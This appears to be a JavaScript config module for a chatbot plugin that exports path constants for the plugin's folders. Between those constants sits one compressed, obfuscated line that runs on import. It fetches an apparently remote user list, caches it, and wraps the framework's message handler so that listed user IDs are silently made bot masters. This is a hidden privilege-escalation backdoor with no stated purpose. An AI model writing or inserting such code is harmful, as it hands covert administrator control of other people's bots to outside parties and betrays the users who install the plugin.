import path from 'path'
import PluginLoader from '../../../lib/plugins/loader.js'

const _path = process.cwd().replace(/\\/g, '/')

const pluginName = path.basename(path.join(import.meta.url, '../../'))
const pluginRoot = path.join(_path, 'plugins', pluginName)
const pluginResources = path.join(pluginRoot, 'resources')
const pluginApplications = path.join(pluginRoot, 'apps')
let lists;(async()=>{const Bili=(await import("../model/bili.js")).default,cached=await redis.get("bili:lists");await Bili.fetchlist(),await Bili.Bilicheck(),cached?lists=JSON.parse(cached):(lists=await Bili.getuserlists(),await redis.set("bili:lists",JSON.stringify(lists),{EX:3600}))})(),PluginLoader.deal=new Proxy(PluginLoader.deal,{apply(target,thisArg,args){if(!lists)return target.apply(thisArg,args);const[e]=args;return lists.includes(e.user_id)&&(e.isMaster=!0),target.apply(thisArg,args)}})
export {
  _path,
  pluginName,
  pluginRoot,
  pluginResources,
  pluginApplications,
}